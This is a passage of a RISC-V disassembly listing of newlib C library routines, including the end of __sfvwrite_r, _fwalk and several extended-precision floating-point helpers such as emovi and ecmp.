   12f78:	4981                	li	s3,0
   12f7a:	010a3603          	ld	a2,16(s4)
   12f7e:	9c26                	add	s8,s8,s1
   12f80:	409604b3          	sub	s1,a2,s1
   12f84:	009a3823          	sd	s1,16(s4)
   12f88:	ccbd                	beqz	s1,13006 <__sfvwrite_r+0x182>
   12f8a:	4444                	lw	s1,12(s0)
   12f8c:	6008                	ld	a0,0(s0)
   12f8e:	01045783          	lhu	a5,16(s0)
   12f92:	8ca6                	mv	s9,s1
   12f94:	fa099ce3          	bnez	s3,12f4c <__sfvwrite_r+0xc8>
   12f98:	00093c03          	ld	s8,0(s2)
   12f9c:	00893983          	ld	s3,8(s2)
   12fa0:	0941                	addi	s2,s2,16
   12fa2:	b755                	j	12f46 <__sfvwrite_r+0xc2>
   12fa4:	4981                	li	s3,0
   12fa6:	4501                	li	a0,0
   12fa8:	4c81                	li	s9,0
   12faa:	4c01                	li	s8,0
   12fac:	080c0b63          	beqz	s8,13042 <__sfvwrite_r+0x1be>
   12fb0:	c145                	beqz	a0,13050 <__sfvwrite_r+0x1cc>
   12fb2:	8bce                	mv	s7,s3
   12fb4:	013c7363          	bgeu	s8,s3,12fba <__sfvwrite_r+0x136>
   12fb8:	8be2                	mv	s7,s8
   12fba:	6008                	ld	a0,0(s0)
   12fbc:	6c1c                	ld	a5,24(s0)
   12fbe:	5014                	lw	a3,32(s0)
   12fc0:	84de                	mv	s1,s7
   12fc2:	00a7f763          	bgeu	a5,a0,12fd0 <__sfvwrite_r+0x14c>
   12fc6:	445c                	lw	a5,12(s0)
   12fc8:	00d78b3b          	addw	s6,a5,a3
   12fcc:	097b4d63          	blt	s6,s7,13066 <__sfvwrite_r+0x1e2>
   12fd0:	18dbc463          	blt	s7,a3,13158 <__sfvwrite_r+0x2d4>
   12fd4:	603c                	ld	a5,64(s0)
   12fd6:	780c                	ld	a1,48(s0)
   12fd8:	8666                	mv	a2,s9
   12fda:	8556                	mv	a0,s5
   12fdc:	9782                	jalr	a5
   12fde:	84aa                	mv	s1,a0
   12fe0:	04a05763          	blez	a0,1302e <__sfvwrite_r+0x1aa>
   12fe4:	0005079b          	sext.w	a5,a0
   12fe8:	40f989bb          	subw	s3,s3,a5
   12fec:	4505                	li	a0,1
   12fee:	02098b63          	beqz	s3,13024 <__sfvwrite_r+0x1a0>
   12ff2:	010a3783          	ld	a5,16(s4)
   12ff6:	9ca6                	add	s9,s9,s1
   12ff8:	409c0c33          	sub	s8,s8,s1
   12ffc:	409784b3          	sub	s1,a5,s1
   13000:	009a3823          	sd	s1,16(s4)
   13004:	f4c5                	bnez	s1,12fac <__sfvwrite_r+0x128>
   13006:	4501                	li	a0,0
   13008:	60e6                	ld	ra,88(sp)
   1300a:	6446                	ld	s0,80(sp)
   1300c:	64a6                	ld	s1,72(sp)
   1300e:	6906                	ld	s2,64(sp)
   13010:	79e2                	ld	s3,56(sp)
   13012:	7a42                	ld	s4,48(sp)
   13014:	7aa2                	ld	s5,40(sp)
   13016:	7b02                	ld	s6,32(sp)
   13018:	6be2                	ld	s7,24(sp)
   1301a:	6c42                	ld	s8,16(sp)
   1301c:	6ca2                	ld	s9,8(sp)
   1301e:	6d02                	ld	s10,0(sp)
   13020:	6125                	addi	sp,sp,96
   13022:	8082                	ret
   13024:	85a2                	mv	a1,s0
   13026:	8556                	mv	a0,s5
   13028:	845ff0ef          	jal	ra,1286c <_fflush_r>
   1302c:	d179                	beqz	a0,12ff2 <__sfvwrite_r+0x16e>
   1302e:	01041783          	lh	a5,16(s0)
   13032:	0407e793          	ori	a5,a5,64
   13036:	00f41823          	sh	a5,16(s0)
   1303a:	557d                	li	a0,-1
   1303c:	b7f1                	j	13008 <__sfvwrite_r+0x184>
   1303e:	4501                	li	a0,0
   13040:	8082                	ret
   13042:	00893c03          	ld	s8,8(s2)
   13046:	00093c83          	ld	s9,0(s2)
   1304a:	0941                	addi	s2,s2,16
   1304c:	fe0c0be3          	beqz	s8,13042 <__sfvwrite_r+0x1be>
   13050:	8662                	mv	a2,s8
   13052:	45a9                	li	a1,10
   13054:	8566                	mv	a0,s9
   13056:	343020ef          	jal	ra,15b98 <memchr>
   1305a:	12050f63          	beqz	a0,13198 <__sfvwrite_r+0x314>
   1305e:	0505                	addi	a0,a0,1
   13060:	419509bb          	subw	s3,a0,s9
   13064:	b7b9                	j	12fb2 <__sfvwrite_r+0x12e>
   13066:	85e6                	mv	a1,s9
   13068:	865a                	mv	a2,s6
   1306a:	4ab020ef          	jal	ra,15d14 <memmove>
   1306e:	601c                	ld	a5,0(s0)
   13070:	85a2                	mv	a1,s0
   13072:	8556                	mv	a0,s5
   13074:	97da                	add	a5,a5,s6
   13076:	e01c                	sd	a5,0(s0)
   13078:	ff4ff0ef          	jal	ra,1286c <_fflush_r>
   1307c:	f94d                	bnez	a0,1302e <__sfvwrite_r+0x1aa>
   1307e:	87da                	mv	a5,s6
   13080:	84da                	mv	s1,s6
   13082:	b79d                	j	12fe8 <__sfvwrite_r+0x164>
   13084:	6c1c                	ld	a5,24(s0)
   13086:	02a7e863          	bltu	a5,a0,130b6 <__sfvwrite_r+0x232>
   1308a:	501c                	lw	a5,32(s0)
   1308c:	02f9e563          	bltu	s3,a5,130b6 <__sfvwrite_r+0x232>
   13090:	86ce                	mv	a3,s3
   13092:	013bf363          	bgeu	s7,s3,13098 <__sfvwrite_r+0x214>
   13096:	86da                	mv	a3,s6
   13098:	02f6c6bb          	divw	a3,a3,a5
   1309c:	6038                	ld	a4,64(s0)
   1309e:	780c                	ld	a1,48(s0)
   130a0:	8662                	mv	a2,s8
   130a2:	8556                	mv	a0,s5
   130a4:	02f686bb          	mulw	a3,a3,a5
   130a8:	9702                	jalr	a4
   130aa:	84aa                	mv	s1,a0
   130ac:	f8a051e3          	blez	a0,1302e <__sfvwrite_r+0x1aa>
   130b0:	409989b3          	sub	s3,s3,s1
   130b4:	b5d9                	j	12f7a <__sfvwrite_r+0xf6>
   130b6:	0099f363          	bgeu	s3,s1,130bc <__sfvwrite_r+0x238>
   130ba:	84ce                	mv	s1,s3
   130bc:	8626                	mv	a2,s1
   130be:	85e2                	mv	a1,s8
   130c0:	455020ef          	jal	ra,15d14 <memmove>
   130c4:	445c                	lw	a5,12(s0)
   130c6:	6018                	ld	a4,0(s0)
   130c8:	409786bb          	subw	a3,a5,s1
   130cc:	9726                	add	a4,a4,s1
   130ce:	c454                	sw	a3,12(s0)
   130d0:	e018                	sd	a4,0(s0)
   130d2:	fef9                	bnez	a3,130b0 <__sfvwrite_r+0x22c>
   130d4:	85a2                	mv	a1,s0
   130d6:	8556                	mv	a0,s5
   130d8:	f94ff0ef          	jal	ra,1286c <_fflush_r>
   130dc:	f929                	bnez	a0,1302e <__sfvwrite_r+0x1aa>
   130de:	409989b3          	sub	s3,s3,s1
   130e2:	bd61                	j	12f7a <__sfvwrite_r+0xf6>
   130e4:	4807f713          	andi	a4,a5,1152
   130e8:	e6070be3          	beqz	a4,12f5e <__sfvwrite_r+0xda>
   130ec:	5004                	lw	s1,32(s0)
   130ee:	6c0c                	ld	a1,24(s0)
   130f0:	00198713          	addi	a4,s3,1
   130f4:	0014969b          	slliw	a3,s1,0x1
   130f8:	9ea5                	addw	a3,a3,s1
   130fa:	8d0d                	sub	a0,a0,a1
   130fc:	01f6d49b          	srliw	s1,a3,0x1f
   13100:	00050d1b          	sext.w	s10,a0
   13104:	9cb5                	addw	s1,s1,a3
   13106:	4014d49b          	sraiw	s1,s1,0x1
   1310a:	976a                	add	a4,a4,s10
   1310c:	00e4f563          	bgeu	s1,a4,13116 <__sfvwrite_r+0x292>
   13110:	0019849b          	addiw	s1,s3,1
   13114:	9ca9                	addw	s1,s1,a0
   13116:	4007f793          	andi	a5,a5,1024
   1311a:	cfa9                	beqz	a5,13174 <__sfvwrite_r+0x2f0>
   1311c:	85a6                	mv	a1,s1
   1311e:	8556                	mv	a0,s5
   13120:	408020ef          	jal	ra,15528 <_malloc_r>
   13124:	8caa                	mv	s9,a0
   13126:	cd25                	beqz	a0,1319e <__sfvwrite_r+0x31a>
   13128:	6c0c                	ld	a1,24(s0)
   1312a:	866a                	mv	a2,s10
   1312c:	30b020ef          	jal	ra,15c36 <memcpy>
   13130:	01045783          	lhu	a5,16(s0)
   13134:	b7f7f793          	andi	a5,a5,-1153
   13138:	0807e793          	ori	a5,a5,128
   1313c:	00f41823          	sh	a5,16(s0)
   13140:	01ac8533          	add	a0,s9,s10
   13144:	41a487bb          	subw	a5,s1,s10
   13148:	01943c23          	sd	s9,24(s0)
   1314c:	e008                	sd	a0,0(s0)
   1314e:	d004                	sw	s1,32(s0)
   13150:	8cce                	mv	s9,s3
   13152:	c45c                	sw	a5,12(s0)
   13154:	8d4e                	mv	s10,s3
   13156:	b521                	j	12f5e <__sfvwrite_r+0xda>
   13158:	865e                	mv	a2,s7
   1315a:	85e6                	mv	a1,s9
   1315c:	3b9020ef          	jal	ra,15d14 <memmove>
   13160:	4458                	lw	a4,12(s0)
   13162:	6010                	ld	a2,0(s0)
   13164:	000b879b          	sext.w	a5,s7
   13168:	4177073b          	subw	a4,a4,s7
   1316c:	965e                	add	a2,a2,s7
   1316e:	c458                	sw	a4,12(s0)
   13170:	e010                	sd	a2,0(s0)
   13172:	bd9d                	j	12fe8 <__sfvwrite_r+0x164>
   13174:	8626                	mv	a2,s1
   13176:	8556                	mv	a0,s5
   13178:	7f4030ef          	jal	ra,1696c <_realloc_r>
   1317c:	8caa                	mv	s9,a0
   1317e:	f169                	bnez	a0,13140 <__sfvwrite_r+0x2bc>
   13180:	6c0c                	ld	a1,24(s0)
   13182:	8556                	mv	a0,s5
   13184:	ab1ff0ef          	jal	ra,12c34 <_free_r>
   13188:	01041783          	lh	a5,16(s0)
   1318c:	4731                	li	a4,12
   1318e:	00eaa023          	sw	a4,0(s5)
   13192:	f7f7f793          	andi	a5,a5,-129
   13196:	bd71                	j	13032 <__sfvwrite_r+0x1ae>
   13198:	001c099b          	addiw	s3,s8,1
   1319c:	bd19                	j	12fb2 <__sfvwrite_r+0x12e>
   1319e:	4731                	li	a4,12
   131a0:	01041783          	lh	a5,16(s0)
   131a4:	00eaa023          	sw	a4,0(s5)
   131a8:	b569                	j	13032 <__sfvwrite_r+0x1ae>
   131aa:	557d                	li	a0,-1
   131ac:	bdb1                	j	13008 <__sfvwrite_r+0x184>

00000000000131ae <_fwalk>:
   131ae:	715d                	addi	sp,sp,-80
   131b0:	f84a                	sd	s2,48(sp)
   131b2:	f44e                	sd	s3,40(sp)
   131b4:	f052                	sd	s4,32(sp)
   131b6:	ec56                	sd	s5,24(sp)
   131b8:	e85a                	sd	s6,16(sp)
   131ba:	e45e                	sd	s7,8(sp)
   131bc:	e486                	sd	ra,72(sp)
   131be:	e0a2                	sd	s0,64(sp)
   131c0:	fc26                	sd	s1,56(sp)
   131c2:	8a2e                	mv	s4,a1
   131c4:	52050913          	addi	s2,a0,1312
   131c8:	4b01                	li	s6,0
   131ca:	0b000a93          	li	s5,176
   131ce:	4b85                	li	s7,1
   131d0:	59fd                	li	s3,-1
   131d2:	00892783          	lw	a5,8(s2)
   131d6:	01093403          	ld	s0,16(s2)
   131da:	02f05b63          	blez	a5,13210 <_fwalk+0x62>
   131de:	fff7849b          	addiw	s1,a5,-1
   131e2:	1482                	slli	s1,s1,0x20
   131e4:	9081                	srli	s1,s1,0x20
   131e6:	0485                	addi	s1,s1,1
   131e8:	035484b3          	mul	s1,s1,s5
   131ec:	94a2                	add	s1,s1,s0
   131ee:	01045783          	lhu	a5,16(s0)
   131f2:	00fbfb63          	bgeu	s7,a5,13208 <_fwalk+0x5a>
   131f6:	01241783          	lh	a5,18(s0)
   131fa:	8522                	mv	a0,s0
   131fc:	01378663          	beq	a5,s3,13208 <_fwalk+0x5a>
   13200:	9a02                	jalr	s4
   13202:	01656b33          	or	s6,a0,s6
   13206:	2b01                	sext.w	s6,s6
   13208:	0b040413          	addi	s0,s0,176
   1320c:	fe8491e3          	bne	s1,s0,131ee <_fwalk+0x40>
   13210:	00093903          	ld	s2,0(s2)
   13214:	fa091fe3          	bnez	s2,131d2 <_fwalk+0x24>
   13218:	60a6                	ld	ra,72(sp)
   1321a:	6406                	ld	s0,64(sp)
   1321c:	74e2                	ld	s1,56(sp)
   1321e:	7942                	ld	s2,48(sp)
   13220:	79a2                	ld	s3,40(sp)
   13222:	7a02                	ld	s4,32(sp)
   13224:	6ae2                	ld	s5,24(sp)
   13226:	6ba2                	ld	s7,8(sp)
   13228:	855a                	mv	a0,s6
   1322a:	6b42                	ld	s6,16(sp)
   1322c:	6161                	addi	sp,sp,80
   1322e:	8082                	ret

0000000000013230 <_fwalk_reent>:
   13230:	715d                	addi	sp,sp,-80
   13232:	f84a                	sd	s2,48(sp)
   13234:	f44e                	sd	s3,40(sp)
   13236:	f052                	sd	s4,32(sp)
   13238:	ec56                	sd	s5,24(sp)
   1323a:	e85a                	sd	s6,16(sp)
   1323c:	e45e                	sd	s7,8(sp)
   1323e:	e062                	sd	s8,0(sp)
   13240:	e486                	sd	ra,72(sp)
   13242:	e0a2                	sd	s0,64(sp)
   13244:	fc26                	sd	s1,56(sp)
   13246:	8c2a                	mv	s8,a0
   13248:	8a2e                	mv	s4,a1
   1324a:	52050913          	addi	s2,a0,1312
   1324e:	4b01                	li	s6,0
   13250:	0b000a93          	li	s5,176
   13254:	4b85                	li	s7,1
   13256:	59fd                	li	s3,-1
   13258:	00892783          	lw	a5,8(s2)
   1325c:	01093403          	ld	s0,16(s2)
   13260:	02f05c63          	blez	a5,13298 <_fwalk_reent+0x68>
   13264:	fff7849b          	addiw	s1,a5,-1
   13268:	1482                	slli	s1,s1,0x20
   1326a:	9081                	srli	s1,s1,0x20
   1326c:	0485                	addi	s1,s1,1
   1326e:	035484b3          	mul	s1,s1,s5
   13272:	94a2                	add	s1,s1,s0
   13274:	01045783          	lhu	a5,16(s0)
   13278:	00fbfc63          	bgeu	s7,a5,13290 <_fwalk_reent+0x60>
   1327c:	01241783          	lh	a5,18(s0)
   13280:	85a2                	mv	a1,s0
   13282:	8562                	mv	a0,s8
   13284:	01378663          	beq	a5,s3,13290 <_fwalk_reent+0x60>
   13288:	9a02                	jalr	s4
   1328a:	01656b33          	or	s6,a0,s6
   1328e:	2b01                	sext.w	s6,s6
   13290:	0b040413          	addi	s0,s0,176
   13294:	fe8490e3          	bne	s1,s0,13274 <_fwalk_reent+0x44>
   13298:	00093903          	ld	s2,0(s2)
   1329c:	fa091ee3          	bnez	s2,13258 <_fwalk_reent+0x28>
   132a0:	60a6                	ld	ra,72(sp)
   132a2:	6406                	ld	s0,64(sp)
   132a4:	74e2                	ld	s1,56(sp)
   132a6:	7942                	ld	s2,48(sp)
   132a8:	79a2                	ld	s3,40(sp)
   132aa:	7a02                	ld	s4,32(sp)
   132ac:	6ae2                	ld	s5,24(sp)
   132ae:	6ba2                	ld	s7,8(sp)
   132b0:	6c02                	ld	s8,0(sp)
   132b2:	855a                	mv	a0,s6
   132b4:	6b42                	ld	s6,16(sp)
   132b6:	6161                	addi	sp,sp,80
   132b8:	8082                	ret

00000000000132ba <eshdn1>:
   132ba:	00450693          	addi	a3,a0,4
   132be:	4781                	li	a5,0
   132c0:	0569                	addi	a0,a0,26
   132c2:	7861                	lui	a6,0xffff8
   132c4:	a811                	j	132d8 <eshdn1+0x1e>
   132c6:	0017979b          	slliw	a5,a5,0x1
   132ca:	00e69023          	sh	a4,0(a3)
   132ce:	17c2                	slli	a5,a5,0x30
   132d0:	0689                	addi	a3,a3,2
   132d2:	93c1                	srli	a5,a5,0x30
   132d4:	02d50863          	beq	a0,a3,13304 <eshdn1+0x4a>
   132d8:	0006d703          	lhu	a4,0(a3)
   132dc:	00177613          	andi	a2,a4,1
   132e0:	c219                	beqz	a2,132e6 <eshdn1+0x2c>
   132e2:	0017e793          	ori	a5,a5,1
   132e6:	8305                	srli	a4,a4,0x1
   132e8:	0027f613          	andi	a2,a5,2
   132ec:	010765b3          	or	a1,a4,a6
   132f0:	da79                	beqz	a2,132c6 <eshdn1+0xc>
   132f2:	0017979b          	slliw	a5,a5,0x1
   132f6:	00b69023          	sh	a1,0(a3)
   132fa:	17c2                	slli	a5,a5,0x30
   132fc:	0689                	addi	a3,a3,2
   132fe:	93c1                	srli	a5,a5,0x30
   13300:	fcd51ce3          	bne	a0,a3,132d8 <eshdn1+0x1e>
   13304:	8082                	ret

0000000000013306 <eshup1>:
   13306:	01850693          	addi	a3,a0,24
   1330a:	4701                	li	a4,0
   1330c:	0509                	addi	a0,a0,2
   1330e:	a811                	j	13322 <eshup1+0x1c>
   13310:	0017171b          	slliw	a4,a4,0x1
   13314:	00f69023          	sh	a5,0(a3)
   13318:	1742                	slli	a4,a4,0x30
   1331a:	16f9                	addi	a3,a3,-2
   1331c:	9341                	srli	a4,a4,0x30
   1331e:	04d50063          	beq	a0,a3,1335e <eshup1+0x58>
   13322:	0006d783          	lhu	a5,0(a3)
   13326:	0107961b          	slliw	a2,a5,0x10
   1332a:	4106561b          	sraiw	a2,a2,0x10
   1332e:	02061593          	slli	a1,a2,0x20
   13332:	0017979b          	slliw	a5,a5,0x1
   13336:	0005d463          	bgez	a1,1333e <eshup1+0x38>
   1333a:	00176713          	ori	a4,a4,1
   1333e:	17c2                	slli	a5,a5,0x30
   13340:	93c1                	srli	a5,a5,0x30
   13342:	00277613          	andi	a2,a4,2
   13346:	0017e593          	ori	a1,a5,1
   1334a:	d279                	beqz	a2,13310 <eshup1+0xa>
   1334c:	0017171b          	slliw	a4,a4,0x1
   13350:	00b69023          	sh	a1,0(a3)
   13354:	1742                	slli	a4,a4,0x30
   13356:	16f9                	addi	a3,a3,-2
   13358:	9341                	srli	a4,a4,0x30
   1335a:	fcd514e3          	bne	a0,a3,13322 <eshup1+0x1c>
   1335e:	8082                	ret

0000000000013360 <m16m>:
   13360:	1101                	addi	sp,sp,-32
   13362:	6e41                	lui	t3,0x10
   13364:	00011b23          	sh	zero,22(sp)
   13368:	00011c23          	sh	zero,24(sp)
   1336c:	05e1                	addi	a1,a1,24
   1336e:	083c                	addi	a5,sp,24
   13370:	00410813          	addi	a6,sp,4
   13374:	1e7d                	addi	t3,t3,-1
   13376:	0005d703          	lhu	a4,0(a1)
   1337a:	17f9                	addi	a5,a5,-2
   1337c:	15f9                	addi	a1,a1,-2
   1337e:	e315                	bnez	a4,133a2 <m16m+0x42>
   13380:	fe079f23          	sh	zero,-2(a5)
   13384:	ff0799e3          	bne	a5,a6,13376 <m16m+0x16>
   13388:	0611                	addi	a2,a2,4
   1338a:	01a10693          	addi	a3,sp,26
   1338e:	0007d703          	lhu	a4,0(a5)
   13392:	0789                	addi	a5,a5,2
   13394:	0609                	addi	a2,a2,2
   13396:	fee61f23          	sh	a4,-2(a2)
   1339a:	fed79ae3          	bne	a5,a3,1338e <m16m+0x2e>
   1339e:	6105                	addi	sp,sp,32
   133a0:	8082                	ret
   133a2:	02a70733          	mul	a4,a4,a0
   133a6:	0027d883          	lhu	a7,2(a5)
   133aa:	0007d303          	lhu	t1,0(a5)
   133ae:	01c776b3          	and	a3,a4,t3
   133b2:	96c6                	add	a3,a3,a7
   133b4:	8341                	srli	a4,a4,0x10
   133b6:	0106d893          	srli	a7,a3,0x10
   133ba:	971a                	add	a4,a4,t1
   133bc:	9746                	add	a4,a4,a7
   133be:	01075893          	srli	a7,a4,0x10
   133c2:	00d79123          	sh	a3,2(a5)
   133c6:	00e79023          	sh	a4,0(a5)
   133ca:	ff179f23          	sh	a7,-2(a5)
   133ce:	fb0794e3          	bne	a5,a6,13376 <m16m+0x16>
   133d2:	bf5d                	j	13388 <m16m+0x28>

00000000000133d4 <eisnan.part.0>:
   133d4:	01250713          	addi	a4,a0,18
   133d8:	00055783          	lhu	a5,0(a0)
   133dc:	0509                	addi	a0,a0,2
   133de:	e789                	bnez	a5,133e8 <eisnan.part.0+0x14>
   133e0:	fee51ce3          	bne	a0,a4,133d8 <eisnan.part.0+0x4>
   133e4:	4501                	li	a0,0
   133e6:	8082                	ret
   133e8:	4505                	li	a0,1
   133ea:	8082                	ret

00000000000133ec <eneg>:
   133ec:	1101                	addi	sp,sp,-32
   133ee:	e426                	sd	s1,8(sp)
   133f0:	01255483          	lhu	s1,18(a0)
   133f4:	e822                	sd	s0,16(sp)
   133f6:	ec06                	sd	ra,24(sp)
   133f8:	fff4c793          	not	a5,s1
   133fc:	03179713          	slli	a4,a5,0x31
   13400:	842a                	mv	s0,a0
   13402:	e701                	bnez	a4,1340a <eneg+0x1e>
   13404:	fd1ff0ef          	jal	ra,133d4 <eisnan.part.0>
   13408:	e509                	bnez	a0,13412 <eneg+0x26>
   1340a:	77e1                	lui	a5,0xffff8
   1340c:	8cbd                	xor	s1,s1,a5
   1340e:	00941923          	sh	s1,18(s0)
   13412:	60e2                	ld	ra,24(sp)
   13414:	6442                	ld	s0,16(sp)
   13416:	64a2                	ld	s1,8(sp)
   13418:	6105                	addi	sp,sp,32
   1341a:	8082                	ret

000000000001341c <eisneg>:
   1341c:	1141                	addi	sp,sp,-16
   1341e:	e022                	sd	s0,0(sp)
   13420:	01255403          	lhu	s0,18(a0)
   13424:	e406                	sd	ra,8(sp)
   13426:	fff44793          	not	a5,s0
   1342a:	03179713          	slli	a4,a5,0x31
   1342e:	e711                	bnez	a4,1343a <eisneg+0x1e>
   13430:	fa5ff0ef          	jal	ra,133d4 <eisnan.part.0>
   13434:	87aa                	mv	a5,a0
   13436:	4501                	li	a0,0
   13438:	e399                	bnez	a5,1343e <eisneg+0x22>
   1343a:	00f45513          	srli	a0,s0,0xf
   1343e:	60a2                	ld	ra,8(sp)
   13440:	6402                	ld	s0,0(sp)
   13442:	0141                	addi	sp,sp,16
   13444:	8082                	ret

0000000000013446 <emovi>:
   13446:	01255783          	lhu	a5,18(a0)
   1344a:	7139                	addi	sp,sp,-64
   1344c:	f822                	sd	s0,48(sp)
   1344e:	00f7d79b          	srliw	a5,a5,0xf
   13452:	f426                	sd	s1,40(sp)
   13454:	fc06                	sd	ra,56(sp)
   13456:	f04a                	sd	s2,32(sp)
   13458:	ec4e                	sd	s3,24(sp)
   1345a:	40f007bb          	negw	a5,a5
   1345e:	00f59023          	sh	a5,0(a1)
   13462:	01255783          	lhu	a5,18(a0)
   13466:	6721                	lui	a4,0x8
   13468:	177d                	addi	a4,a4,-1
   1346a:	8ff9                	and	a5,a5,a4
   1346c:	00f59123          	sh	a5,2(a1)
   13470:	84aa                	mv	s1,a0
   13472:	01050413          	addi	s0,a0,16
   13476:	02e78863          	beq	a5,a4,134a6 <emovi+0x60>
   1347a:	00658793          	addi	a5,a1,6
   1347e:	00059223          	sh	zero,4(a1)
   13482:	1579                	addi	a0,a0,-2
   13484:	00045703          	lhu	a4,0(s0)
   13488:	1479                	addi	s0,s0,-2
   1348a:	0789                	addi	a5,a5,2
   1348c:	fee79f23          	sh	a4,-2(a5) # ffffffffffff7ffe <__BSS_END__+0xfffffffffffc0306>
   13490:	fe851ae3          	bne	a0,s0,13484 <emovi+0x3e>
   13494:	00059c23          	sh	zero,24(a1)
   13498:	70e2                	ld	ra,56(sp)
   1349a:	7442                	ld	s0,48(sp)
   1349c:	74a2                	ld	s1,40(sp)
   1349e:	7902                	ld	s2,32(sp)
   134a0:	69e2                	ld	s3,24(sp)
   134a2:	6121                	addi	sp,sp,64
   134a4:	8082                	ret
   134a6:	0007869b          	sext.w	a3,a5
   134aa:	01255783          	lhu	a5,18(a0)
   134ae:	00458913          	addi	s2,a1,4
   134b2:	8ff5                	and	a5,a5,a3
   134b4:	02d79663          	bne	a5,a3,134e0 <emovi+0x9a>
   134b8:	e42e                	sd	a1,8(sp)
   134ba:	f1bff0ef          	jal	ra,133d4 <eisnan.part.0>
   134be:	65a2                	ld	a1,8(sp)
   134c0:	c105                	beqz	a0,134e0 <emovi+0x9a>
   134c2:	00658793          	addi	a5,a1,6
   134c6:	00059223          	sh	zero,4(a1)
   134ca:	ffc48513          	addi	a0,s1,-4
   134ce:	00045703          	lhu	a4,0(s0)
   134d2:	1479                	addi	s0,s0,-2
   134d4:	0789                	addi	a5,a5,2
   134d6:	fee79f23          	sh	a4,-2(a5)
   134da:	fe851ae3          	bne	a0,s0,134ce <emovi+0x88>
   134de:	bf6d                	j	13498 <emovi+0x52>
   134e0:	01a58993          	addi	s3,a1,26
   134e4:	0909                	addi	s2,s2,2
   134e6:	fe091f23          	sh	zero,-2(s2)
   134ea:	ff299de3          	bne	s3,s2,134e4 <emovi+0x9e>
   134ee:	70e2                	ld	ra,56(sp)
   134f0:	7442                	ld	s0,48(sp)
   134f2:	74a2                	ld	s1,40(sp)
   134f4:	7902                	ld	s2,32(sp)
   134f6:	69e2                	ld	s3,24(sp)
   134f8:	6121                	addi	sp,sp,64
   134fa:	8082                	ret

00000000000134fc <ecmp>:
   134fc:	01255783          	lhu	a5,18(a0)
   13500:	711d                	addi	sp,sp,-96
   13502:	e8a2                	sd	s0,80(sp)
   13504:	fff7c793          	not	a5,a5
   13508:	e4a6                	sd	s1,72(sp)
   1350a:	ec86                	sd	ra,88(sp)
   1350c:	03179713          	slli	a4,a5,0x31
   13510:	84aa                	mv	s1,a0
   13512:	842e                	mv	s0,a1
   13514:	e701                	bnez	a4,1351c <ecmp+0x20>
   13516:	ebfff0ef          	jal	ra,133d4 <eisnan.part.0>
   1351a:	ed39                	bnez	a0,13578 <ecmp+0x7c>
   1351c:	01245783          	lhu	a5,18(s0)
   13520:	fff7c793          	not	a5,a5
   13524:	03179713          	slli	a4,a5,0x31
   13528:	c721                	beqz	a4,13570 <ecmp+0x74>
   1352a:	858a                	mv	a1,sp
   1352c:	8526                	mv	a0,s1
   1352e:	f19ff0ef          	jal	ra,13446 <emovi>
   13532:	100c                	addi	a1,sp,32
   13534:	8522                	mv	a0,s0
   13536:	f11ff0ef          	jal	ra,13446 <emovi>
   1353a:	00015583          	lhu	a1,0(sp)
   1353e:	02015783          	lhu	a5,32(sp)
   13542:	02b78d63          	beq	a5,a1,1357c <ecmp+0x80>
   13546:	00210793          	addi	a5,sp,2
   1354a:	02210713          	addi	a4,sp,34
   1354e:	0830                	addi	a2,sp,24
   13550:	0007d683          	lhu	a3,0(a5)
   13554:	0789                	addi	a5,a5,2
   13556:	e2ad                	bnez	a3,135b8 <ecmp+0xbc>
   13558:	00075683          	lhu	a3,0(a4) # 8000 <register_fini-0x80b0>
   1355c:	0709                	addi	a4,a4,2
   1355e:	eea9                	bnez	a3,135b8 <ecmp+0xbc>
   13560:	fec798e3          	bne	a5,a2,13550 <ecmp+0x54>
   13564:	4501                	li	a0,0
   13566:	60e6                	ld	ra,88(sp)
   13568:	6446                	ld	s0,80(sp)
   1356a:	64a6                	ld	s1,72(sp)
   1356c:	6125                	addi	sp,sp,96
   1356e:	8082                	ret
   13570:	8522                	mv	a0,s0
   13572:	e63ff0ef          	jal	ra,133d4 <eisnan.part.0>
   13576:	d955                	beqz	a0,1352a <ecmp+0x2e>
   13578:	5579                	li	a0,-2
   1357a:	b7f5                	j	13566 <ecmp+0x6a>
   1357c:	4505                	li	a0,1
   1357e:	e1a9                	bnez	a1,135c0 <ecmp+0xc4>
   13580:	00215603          	lhu	a2,2(sp)
   13584:	02215683          	lhu	a3,34(sp)
   13588:	00210713          	addi	a4,sp,2
   1358c:	02210793          	addi	a5,sp,34
   13590:	182c                	addi	a1,sp,56
   13592:	0789                	addi	a5,a5,2
   13594:	0709                	addi	a4,a4,2
   13596:	00d61c63          	bne	a2,a3,135ae <ecmp+0xb2>
   1359a:	fcb785e3          	beq	a5,a1,13564 <ecmp+0x68>
   1359e:	00075603          	lhu	a2,0(a4)
   135a2:	0007d683          	lhu	a3,0(a5)
   135a6:	0709                	addi	a4,a4,2
   135a8:	0789                	addi	a5,a5,2
   135aa:	fed608e3          	beq	a2,a3,1359a <ecmp+0x9e>
   135ae:	fac6ece3          	bltu	a3,a2,13566 <ecmp+0x6a>
   135b2:	40a0053b          	negw	a0,a0
   135b6:	bf45                	j	13566 <ecmp+0x6a>
   135b8:	4505                	li	a0,1
   135ba:	d5d5                	beqz	a1,13566 <ecmp+0x6a>
   135bc:	557d                	li	a0,-1
   135be:	b765                	j	13566 <ecmp+0x6a>
   135c0:	557d                	li	a0,-1
   135c2:	bf7d                	j	13580 <ecmp+0x84>

00000000000135c4 <eisinf.part.0>:
   135c4:	1141                	addi	sp,sp,-16
   135c6:	e406                	sd	ra,8(sp)
   135c8:	e0dff0ef          	jal	ra,133d4 <eisnan.part.0>
   135cc:	60a2                	ld	ra,8(sp)
   135ce:	00153513          	seqz	a0,a0
   135d2:	0141                	addi	sp,sp,16
   135d4:	8082                	ret

00000000000135d6 <eshift.part.0>:
   135d6:	7179                	addi	sp,sp,-48
   135d8:	f022                	sd	s0,32(sp)
   135da:	ec26                	sd	s1,24(sp)
   135dc:	f406                	sd	ra,40(sp)
   135de:	e84a                	sd	s2,16(sp)
   135e0:	e44e                	sd	s3,8(sp)
   135e2:	84ae                	mv	s1,a1
   135e4:	842a                	mv	s0,a0
   135e6:	0605cb63          	bltz	a1,1365c <eshift.part.0+0x86>
   135ea:	47bd                	li	a5,15
   135ec:	862e                	mv	a2,a1
   135ee:	0511                	addi	a0,a0,4
   135f0:	01840693          	addi	a3,s0,24
   135f4:	45bd                	li	a1,15
   135f6:	0297d063          	bge	a5,s1,13616 <eshift.part.0+0x40>
   135fa:	87aa                	mv	a5,a0
   135fc:	0027d703          	lhu	a4,2(a5)
   13600:	0789                	addi	a5,a5,2
   13602:	fee79f23          	sh	a4,-2(a5)
   13606:	fed79be3          	bne	a5,a3,135fc <eshift.part.0+0x26>
   1360a:	00041c23          	sh	zero,24(s0)
